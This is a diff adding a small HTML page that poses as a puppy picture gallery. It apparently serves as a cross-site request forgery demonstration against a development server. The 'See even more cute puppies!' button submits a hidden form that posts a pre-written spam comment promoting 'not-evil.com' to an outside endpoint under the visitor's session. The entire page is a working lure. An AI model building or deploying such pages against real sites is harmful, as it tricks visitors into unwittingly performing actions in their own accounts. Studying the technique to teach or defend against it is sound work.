@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>OMG Puppies!</title>
+
+    <style>
+      body {
+        background-color: #222;
+      }
+      img {
+        max-width: 100%;
+        max-height: 225px;
+      }
+      .hidden {
+        display: none;
+      }
+      .imgWrapper {
+        display: inline-block;
+        max-width: 400px;
+      }
+    </style>
+
+  </head>
+  <body>
+    <div class=imgWrapper>
+      <img src="./cute1.jpg" />
+    </div>
+
+    <div class=imgWrapper>
+      <img src="./cute2.jpg" />
+    </div>
+
+    <div class="form-container">
+      <form method="POST" action="http://dev.m2iller.com:4000/csrf/csrf" id="commentForm">
+        <div class="hidden">
+        <textarea id="commentInput" name="comment" class="comment-input" placeholder="Your comment">
+          Checkout not-evil.com for the greatest dog pictures! I can't get enough!
+        </textarea>
+        </div>
+        <input type="submit" value="See even more cute puppies!"/>
+      </form>
+    </div>
+  </body>
+</html>
